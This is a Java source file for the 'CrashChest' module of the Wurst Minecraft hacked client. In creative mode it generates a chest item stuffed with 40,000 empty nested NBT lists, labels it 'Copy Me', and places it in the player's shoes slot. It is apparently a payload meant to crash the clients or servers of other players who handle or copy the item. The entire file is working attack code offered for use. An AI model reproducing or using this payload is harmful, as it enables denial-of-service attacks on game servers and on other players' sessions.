/*
 * Copyright (c) 2014-2025 Wurst-Imperium and contributors.
 *
 * This source code is subject to the terms of the GNU General Public
 * License, version 3. If a copy of the GPL was not distributed with this
 * file, You can obtain one at: https://www.gnu.org/licenses/gpl-3.0.txt
 */
package net.wurstclient.hacks;

import net.minecraft.class_1799;
import net.minecraft.class_2246;
import net.minecraft.class_2487;
import net.minecraft.class_2499;
import net.minecraft.class_2561;
import net.minecraft.class_9279;
import net.minecraft.class_9334;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.hack.Hack;
import net.wurstclient.util.ChatUtils;

@SearchTags({"crash chest"})
public final class CrashChestHack extends Hack
{
	public CrashChestHack()
	{
		super("CrashChest");
		
		setCategory(Category.ITEMS);
	}
	
	@Override
	protected void onEnable()
	{
		if(!MC.field_1724.method_31549().field_7477)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		
		if(!MC.field_1724.method_31548().method_7372(0).method_7960())
		{
			ChatUtils.error("Please clear your shoes slot.");
			setEnabled(false);
			return;
		}
		
		// generate item
		class_1799 stack = new class_1799(class_2246.field_10034);
		class_2487 nbtCompound = new class_2487();
		class_2499 nbtList = new class_2499();
		for(int i = 0; i < 40000; i++)
			nbtList.add(new class_2499());
		nbtCompound.method_10566("www.wurstclient.net", nbtList);
		stack.method_57379(class_9334.field_49628, class_9279.method_57456(nbtCompound));
		stack.method_57379(class_9334.field_49631, class_2561.method_43470("Copy Me"));
		
		// give item
		MC.field_1724.method_31548().field_7548.set(0, stack);
		ChatUtils.message("Item has been placed in your shoes slot.");
		setEnabled(false);
	}
}
